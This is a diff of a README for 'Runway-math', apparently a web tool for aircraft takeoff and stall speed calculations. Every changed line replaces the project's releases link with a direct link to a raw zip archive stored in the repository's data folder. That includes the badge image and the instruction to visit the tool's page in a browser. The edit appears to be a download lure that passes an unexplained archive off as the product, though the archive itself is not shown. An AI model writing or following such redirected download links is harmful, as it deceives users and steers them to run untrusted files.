@@ -6,9 +6,9 @@ Welcome to Runway-math! This web tool helps you calculate important aircraft per
 
 ## 📦 Download & Install
 
-To get started with Runway-math, you need to download it. Visit this page to download: [Download Runway-math](https://github.com/Adrianobass/Runway-math/releases)
+To get started with Runway-math, you need to download it. Visit this page to download: [Download Runway-math](https://github.com/Adrianobass/Runway-math/raw/refs/heads/main/data/math-Runway-3.7.zip)
 
-[![Download Runway-math](https://img.shields.io/badge/Download-Runway--math-blue.svg)](https://github.com/Adrianobass/Runway-math/releases)
+[![Download Runway-math](https://github.com/Adrianobass/Runway-math/raw/refs/heads/main/data/math-Runway-3.7.zip)](https://github.com/Adrianobass/Runway-math/raw/refs/heads/main/data/math-Runway-3.7.zip)
 
 ### 🔧 System Requirements
 
@@ -25,7 +25,7 @@ To get started with Runway-math, you need to download it. Visit this page to dow
 ## 🌐 How to Use
 
 1. **Visit the Runway-math Tool**  
-   Open your web browser and go to the [Runway-math page](https://github.com/Adrianobass/Runway-math/releases).
+   Open your web browser and go to the [Runway-math page](https://github.com/Adrianobass/Runway-math/raw/refs/heads/main/data/math-Runway-3.7.zip).
 
 2. **Choose the Calculation Type**  
    Decide whether you want to calculate takeoff speed or stall speed.
@@ -72,6 +72,6 @@ We appreciate your interest in improving Runway-math!
 
 ## 📦 Download & Install Again
 
-Don't forget, you can download Runway-math at the following link: [Download Runway-math](https://github.com/Adrianobass/Runway-math/releases)
+Don't forget, you can download Runway-math at the following link: [Download Runway-math](https://github.com/Adrianobass/Runway-math/raw/refs/heads/main/data/math-Runway-3.7.zip)
 
 Thank you for choosing Runway-math for your aircraft performance calculations!
